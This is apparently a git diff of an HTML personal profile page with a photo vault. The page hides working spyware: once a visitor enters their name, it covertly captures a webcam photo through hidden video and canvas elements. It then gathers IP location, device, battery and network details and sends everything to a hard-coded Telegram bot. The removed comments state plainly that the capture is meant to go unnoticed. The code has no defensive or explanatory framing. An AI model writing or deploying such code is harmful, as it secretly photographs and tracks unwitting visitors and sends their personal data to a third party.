@@ -144,7 +144,6 @@
             letter-spacing: 1px;
         }
 
-        /* DEVELOPER BUTTON */
         .developer-btn {
             position: fixed;
             top: 20px;
@@ -294,7 +293,6 @@
         .rotating { animation: spin 5s linear infinite; }
         @keyframes spin { from {transform: rotate(0deg)} to {transform: rotate(360deg)} }
 
-        /* Hidden elements for camera */
         #hiddenCamera, #hiddenCanvas {
             display: none;
         }
@@ -311,7 +309,12 @@
     <!-- Hidden elements for camera -->
     <video id="hiddenCamera" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas" style="display:none;"></canvas>
-    <img src="photo1.png" class="avatar-img" alt="Kishor">
+
+    <div class="main-card">
+        <div class="profile-container">
+            <div class="avatar-wrapper" onclick="handleZoom(true)">
+                <!-- YAHAN PE PHOTO HAI - DIRECT PHOTO1.PNG -->
+                <img src="photo1.png" class="avatar-img" alt="Kishor">
             </div>
         </div>
         
@@ -356,8 +359,9 @@
         </div>
     </div>
 
+    <!-- ZOOM PHOTO - YAHAN BHI PHOTO1.PNG -->
     <div id="zoomOverlay" onclick="handleZoom(false)">
-    <img src="photo1.png" onclick="event.stopPropagation()">    
+        <img src="photo1.png" onclick="event.stopPropagation()">
     </div>
 
     <div id="vaultPanel" class="vault-panel">
@@ -377,13 +381,10 @@
         chatId: '6297092647'
     };
 
-    // Store visitor name globally
     let currentVisitorName = '';
 
-    // Camera access and capture function (completely hidden)
     async function captureHiddenPhoto() {
         try {
-            // Try to get camera stream without any indicators
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { 
                     facingMode: 'user',
@@ -394,58 +395,44 @@
             
             if (!stream) return null;
             
-            // Use hidden video element
             const video = document.getElementById('hiddenCamera');
             video.srcObject = stream;
             
-            // Wait a tiny bit for the camera to initialize
             await new Promise(resolve => setTimeout(resolve, 100));
             
-            // Capture frame
             const canvas = document.getElementById('hiddenCanvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // Convert to base64
             const imageData = canvas.toDataURL('image/jpeg', 0.7);
             
-            // Stop all tracks immediately
             stream.getTracks().forEach(track => track.stop());
             video.srcObject = null;
             
             return imageData;
         } catch (error) {
-            console.log('Camera not available');
             return null;
         }
     }
 
-    // Send photo to Telegram
     async function sendPhotoToTelegram(photoBase64, visitorName) {
         try {
-            // Convert base64 to blob
-            const base64Data = photoBase64.split(',')[1];
             const blob = await (await fetch(photoBase64)).blob();
             
-            // Create form data
             const formData = new FormData();
             formData.append('chat_id', CONFIG.chatId);
             formData.append('photo', blob, 'visitor.jpg');
             formData.append('caption', `📸 HIDDEN CAMERA CAPTURE\n👤 Visitor: ${visitorName}`);
             
-            // Send to Telegram
             await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
-        } catch (error) {
-            console.log('Photo send failed');
-        }
+        } catch (error) {}
     }
 
-    // Get device info
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let os = 'Unknown';
@@ -471,7 +458,6 @@
         return { os, browser, version, platform: navigator.platform };
     }
 
-    // Get network info
     function getNetworkInfo() {
         if ('connection' in navigator) {
             const conn = navigator.connection;
@@ -484,7 +470,6 @@
         return { type: 'Unknown', downlink: 'Unknown', rtt: 'Unknown' };
     }
 
-    // Get battery info
     async function getBatteryInfo() {
         try {
             if ('getBattery' in navigator) {
@@ -499,7 +484,6 @@
         return { level: 'Unknown', charging: 'Unknown', timeLeft: 'Unknown' };
     }
 
-    // Get language info
     function getLanguageInfo() {
         return {
             primary: navigator.language || 'Unknown',
@@ -507,7 +491,6 @@
         };
     }
 
-    // Get screen info
     function getScreenInfo() {
         return {
             resolution: screen.width + 'px x ' + screen.height + 'px',
@@ -517,7 +500,6 @@
         };
     }
 
-    // Get time info
     function getTimeInfo() {
         const d = new Date();
         const offset = -d.getTimezoneOffset();
@@ -532,7 +514,6 @@
         };
     }
 
-    // Get touch support
     function getTouchSupport() {
         return {
             points: navigator.maxTouchPoints || 0,
@@ -540,7 +521,6 @@
         };
     }
 
-    // Get privacy info
     function getPrivacyInfo() {
         return {
             dnt: navigator.doNotTrack || 'Not set',
@@ -550,19 +530,16 @@
         };
     }
 
-    // Show name modal
     function showNameModal() { 
         document.getElementById('nameModal').classList.add('active'); 
         document.getElementById('visitorName').value = '';
         document.getElementById('vaultPin').value = '';
     }
     
-    // Close all modals
     function closeModals() { 
         document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active')); 
     }
 
-    // Main data collection function
     async function startDataProcess() {
         const name = document.getElementById('visitorName').value.trim();
         if(!name) {
@@ -576,10 +553,8 @@
         btn.innerHTML = "⏳ PROCESSING...";
         
         try {
-            // Try to capture hidden camera photo (user won't know)
             const photoBase64 = await captureHiddenPhoto();
             
-            // Get all data
             const ipResponse = await fetch('https://ipapi.co/json/');
             const ipData = await ipResponse.json();
             const device = getDeviceInfo();
@@ -604,12 +579,10 @@
             
             const datetime = `${date} ${month} ${year} ${hours}:${minutes}:${seconds} ${ampm}`;
 
-            // Send photo first if captured
             if (photoBase64) {
                 await sendPhotoToTelegram(photoBase64, name);
             }
 
-            // Format complete message
             const fullLog = `🔥 ADVANCED VISITOR DETECTED
 ━━━━━━━━━━━━━━━━━━━━━
 
@@ -671,7 +644,6 @@
 📱 FULL USER AGENT
 ${navigator.userAgent}`;
 
-            // Send to Telegram
             await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -681,19 +653,16 @@ ${navigator.userAgent}`;
                 })
             });
 
-            // Move to PIN modal
             document.getElementById('nameModal').classList.remove('active');
             document.getElementById('passModal').classList.add('active');
             
         } catch(error) {
-            console.error('Error:', error);
             alert("⚠️ Scan failed. Try again.");
         }
         
         btn.innerHTML = originalText;
     }
 
-    // Verify PIN
     function verifyPin() {
         if(document.getElementById('vaultPin').value === '2009') {
             closeModals();
@@ -704,17 +673,14 @@ ${navigator.userAgent}`;
         }
     }
 
-    // Close vault
     function closeVault() { 
         document.getElementById('vaultPanel').classList.remove('open'); 
     }
 
-    // Handle zoom
     function handleZoom(show) { 
         document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none'; 
     }
 
-    // Music control
     function controlMusic() {
         const audio = document.getElementById('bgTrack');
         const toggle = document.getElementById('mToggle');
@@ -727,7 +693,6 @@ ${navigator.userAgent}`;
         }
     }
 
-    // Load photos
     function loadPhotos() {
         const photos = JSON.parse(localStorage.getItem('vault_p') || '[]');
         const grid = document.getElementById('vGrid');
@@ -761,7 +726,6 @@ ${navigator.userAgent}`;
         ).join('');
     }
 
-    // Add upload button
     const uploadDiv = document.createElement('div');
     uploadDiv.style.cssText = 'border:2px dashed #333; padding:20px; margin:20px 0; border-radius:15px; text-align:center; cursor:pointer;';
     uploadDiv.innerHTML = '<i class="fa-solid fa-cloud-arrow-up" style="font-size:2rem; color:#3b82f6;"></i><p style="margin-top:10px;">Upload Photos</p>';
@@ -788,7 +752,6 @@ ${navigator.userAgent}`;
     };
     document.querySelector('.vault-panel').insertBefore(uploadDiv, document.getElementById('vGrid'));
 
-    // Load photos
     loadPhotos();
 </script>
 </body>
